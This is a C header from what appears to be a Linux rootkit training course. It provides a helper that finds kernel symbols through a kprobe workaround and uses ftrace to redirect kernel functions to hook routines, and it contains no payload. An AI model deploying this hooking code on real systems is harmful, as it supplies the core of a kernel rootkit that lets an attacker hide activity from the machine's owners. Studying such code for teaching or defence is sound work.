/*
 * ftrace_helper.h
 *
 * Helper pour hooker des fonctions kernel via ftrace.
 * Base sur le travail de TheXcellerator (xcellerator.github.io).
 * Simplifie pour rootkitlings: un hook a la fois, pattern clair.
 *
 * Usage:
 *   1. Definis ta fonction hook avec la meme signature que l'originale
 *   2. Declare un struct fthelper_hook
 *   3. Appelle fthelper_install / fthelper_remove dans init/exit
 *
 * Voir exercice 021 pour l'explication detaillee du mecanisme ftrace.
 */

#ifndef FTRACE_HELPER_H
#define FTRACE_HELPER_H

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long fthelper_lookup_name(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0)
        return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}
#else
static unsigned long fthelper_lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

struct fthelper_hook {
    const char *name;
    void *hook_fn;
    void *orig_fn;
    unsigned long address;
    struct ftrace_ops ops;
};

static void notrace fthelper_callback(unsigned long ip, unsigned long parent_ip,
                                       struct ftrace_ops *ops,
                                       struct ftrace_regs *fregs)
{
    struct fthelper_hook *hook =
        container_of(ops, struct fthelper_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->hook_fn;
}

static int fthelper_install(struct fthelper_hook *hook)
{
    int ret;

    hook->address = fthelper_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("fthelper: symbol '%s' not found\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->orig_fn) = hook->address;

    hook->ops.func = fthelper_callback;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (ret) {
        pr_err("fthelper: ftrace_set_filter_ip failed for '%s': %d\n",
               hook->name, ret);
        return ret;
    }

    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        pr_err("fthelper: register_ftrace_function failed for '%s': %d\n",
               hook->name, ret);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return ret;
    }

    pr_info("fthelper: hooked '%s' at 0x%lx\n", hook->name, hook->address);
    return 0;
}

static void fthelper_remove(struct fthelper_hook *hook)
{
    int ret;

    ret = unregister_ftrace_function(&hook->ops);
    if (ret)
        pr_err("fthelper: unregister failed for '%s': %d\n",
               hook->name, ret);

    ret = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (ret)
        pr_err("fthelper: filter remove failed for '%s': %d\n",
               hook->name, ret);

    pr_info("fthelper: unhooked '%s'\n", hook->name);
}

#endif /* FTRACE_HELPER_H */
